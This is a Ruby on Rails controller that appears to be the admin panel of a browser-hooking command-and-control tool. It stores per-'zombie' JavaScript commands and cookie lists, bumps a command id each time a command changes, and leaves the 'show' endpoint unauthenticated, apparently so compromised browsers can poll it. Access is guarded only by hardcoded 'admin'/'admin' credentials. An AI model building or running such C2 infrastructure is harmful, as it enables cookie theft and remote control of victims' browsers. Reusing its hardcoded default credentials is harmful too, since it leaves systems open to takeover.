class CcconfigsController < ApplicationController
http_basic_authenticate_with :name => "admin", :password => "admin", :except => :show
protect_from_forgery
  # GET /ccconfigs
  # GET /ccconfigs.json
  def index
    @ccconfigs = Ccconfig.all

    respond_to do |format|
      format.html # index.html.erb
      format.json { render json: @ccconfigs }
    end
  end

  # GET /ccconfigs/1
  # GET /ccconfigs/1.json
  def show
    @ccconfig = Ccconfig.find(params[:id])

    respond_to do |format|
      format.html # show.html.erb
      format.json { render json: @ccconfig }
    end
  end

  # GET /ccconfigs/new
  # GET /ccconfigs/new.json
  def new
    @ccconfig = Ccconfig.new

    respond_to do |format|
      format.html # new.html.erb
      format.json { render json: @ccconfig }
    end
  end

  # GET /ccconfigs/1/edit
  def edit
    @ccconfig = Ccconfig.find(params[:id])
	@zombie = Zombie.find(@ccconfig.zombie_id)
  end
  
  def demo
    @ccconfig = Ccconfig.find(params[:id])
	@zombie = Zombie.find(@ccconfig.zombie_id) 
  end
  
  # POST /ccconfigs
  # POST /ccconfigs.json
  def create
	@zombie = Zombie.find(params[:zombie_id])
    @ccconfig = @zombie.ccconfig.create(params[:ccconfig])
    redirect_to zombie_path(@zombie)
	
    #@ccconfig = Ccconfig.new(params[:ccconfig])

    #respond_to do |format|
    #  if @ccconfig.save
    #    format.html { redirect_to @ccconfig, notice: 'Ccconfig was successfully created.' }
    #    format.json { render json: @ccconfig, status: :created, location: @ccconfig }
    #  else
    #    format.html { render action: "new" }
    #    format.json { render json: @ccconfig.errors, status: :unprocessable_entity }
    #  end
    #end
  end

  # PUT /ccconfigs/1
  # PUT /ccconfigs/1.json
  def update
    @ccconfig = Ccconfig.find(params[:id])
	@jscommandid = params[:ccconfig][:jscommandid]
	@jscommand = params[:ccconfig][:jscommand]
	
	#if (@ccconfig.jscommand != @jscommand)
	# ugly hack to detect if user is coming from demo button page or edit page
	# if coming from demo button page (or jscommand changed), increment jscommandid
	if (!(params[:ccconfig][:cookielist]) || (@ccconfig.jscommand != @jscommand))
		params[:ccconfig][:jscommandid] = (@jscommandid.to_i + 1).to_s
	end
    respond_to do |format|
      if @ccconfig.update_attributes(params[:ccconfig])
        format.html { redirect_to :controller => "ccconfigs", :action => "demo", :id => @ccconfig.id , notice: 'Ccconfig was successfully updated.' }
        format.json { head :no_content }
		format.js  
      else
        format.html { render action: "edit" }
        format.json { render json: @ccconfig.errors, status: :unprocessable_entity }
      end
    end
  end

  # DELETE /ccconfigs/1
  # DELETE /ccconfigs/1.json
  def destroy
    @ccconfig = Ccconfig.find(params[:id])
    @ccconfig.destroy

    respond_to do |format|
      format.html { redirect_to ccconfigs_url }
      format.json { head :no_content }
    end
  end
end
